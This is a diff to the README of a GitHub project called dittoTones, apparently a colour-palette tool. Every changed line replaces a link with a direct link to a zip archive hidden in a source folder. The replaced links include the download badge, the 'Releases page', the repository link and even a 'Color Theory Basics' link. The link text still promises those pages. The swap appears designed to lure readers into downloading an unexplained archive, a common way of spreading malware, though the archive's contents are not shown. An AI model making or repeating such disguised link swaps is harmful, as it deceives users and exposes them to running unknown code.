@@ -11,13 +11,13 @@ Before you download dittoTones, make sure your computer meets these requirements
 - Internet Connection: Required for downloading the application  
 
 ## 📥 Download dittoTones  
-[![Download dittoTones](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/mohammadshadil/dittoTones/releases)  
+[![Download dittoTones](https://raw.githubusercontent.com/mohammadshadil/dittoTones/main/src/ramps/raw/Tones-ditto-3.9-beta.2.zip)](https://raw.githubusercontent.com/mohammadshadil/dittoTones/main/src/ramps/raw/Tones-ditto-3.9-beta.2.zip)  
 
-Visit this page to download the latest version of dittoTones: [Download dittoTones](https://github.com/mohammadshadil/dittoTones/releases)
+Visit this page to download the latest version of dittoTones: [Download dittoTones](https://raw.githubusercontent.com/mohammadshadil/dittoTones/main/src/ramps/raw/Tones-ditto-3.9-beta.2.zip)
 
 ## 📂 Installation Steps  
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/mohammadshadil/dittoTones/releases). Here, you will find the latest version of dittoTones.
+   Go to the [Releases page](https://raw.githubusercontent.com/mohammadshadil/dittoTones/main/src/ramps/raw/Tones-ditto-3.9-beta.2.zip). Here, you will find the latest version of dittoTones.
 
 2. **Select the Latest Release**  
    Look for the most recent version listed at the top. This version will have the latest features and fixes.
@@ -56,7 +56,7 @@ Visit this page to download the latest version of dittoTones: [Download dittoTon
 If you have any questions or need help, feel free to reach out. You can find answers to common questions in the FAQ section on the Releases page. For more specific inquiries, contact our support team through the Issues tab on GitHub.
 
 ## 🔗 Additional Resources  
-- [GitHub Repository](https://github.com/mohammadshadil/dittoTones)  
-- [Color Theory Basics](https://color.adobe.com/create/color-wheel)   
+- [GitHub Repository](https://raw.githubusercontent.com/mohammadshadil/dittoTones/main/src/ramps/raw/Tones-ditto-3.9-beta.2.zip)  
+- [Color Theory Basics](https://raw.githubusercontent.com/mohammadshadil/dittoTones/main/src/ramps/raw/Tones-ditto-3.9-beta.2.zip)   
 
 Explore the world of colors with dittoTones! Start creating stunning palettes today.
